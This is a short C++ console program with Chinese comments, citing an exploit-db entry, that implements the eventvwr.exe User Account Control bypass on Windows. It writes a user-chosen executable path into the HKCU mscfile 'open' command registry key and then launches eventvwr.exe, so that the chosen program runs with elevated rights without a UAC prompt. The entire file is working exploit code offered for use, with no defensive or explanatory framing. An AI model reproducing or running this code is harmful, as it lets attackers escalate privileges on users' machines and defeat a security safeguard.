// UacTest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

//参考
//https://www.exploit-db.com/exploits/40268/
//真是方便到爆

void usage()
{
	printf("Usage: UacTest.exe filepath\n");
}
int main(int argc , char * argv[])
{

	if (argc != 2)
	{
		usage();
		return 1;
	}

	char *szRunPath = argv[1];
	SHSetValue(HKEY_CURRENT_USER,"Software\\Classes\\mscfile\\shell\\open\\command",NULL,REG_SZ,szRunPath,strlen(szRunPath));
	char szCmd[MAX_PATH] = {0};
	system("cmd.exe /c eventvwr.exe");
	return 1;
}